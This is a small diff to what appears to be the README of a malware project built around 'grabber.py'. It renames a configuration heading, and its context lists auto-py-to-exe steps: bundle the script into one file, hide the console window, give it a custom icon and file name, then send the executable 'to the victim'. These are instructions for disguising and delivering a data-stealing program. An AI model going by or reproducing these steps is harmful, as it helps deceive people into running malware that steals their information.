@@ -47,11 +47,12 @@ or normally download the ZIP file from **Code > Download ZIP**
 ```bash
 auto-py-to-exe
 ```
-## ⚙️ Configuration
+## ⚙️ EXE Configuration
 - Select the path to the `grabber.py`
 - Select **ONEFILE** option! (--onefile)
 - Select **Hide the console** (--windowed)
 - Select **an icon** (must be .ICO) (--icon)
 - In advanced input .exe **file name** (--name)
 - Hit the Convert Button! THATS ALL
+
 You should get an **executable file (.exe)** that you can send to the victim. ✅
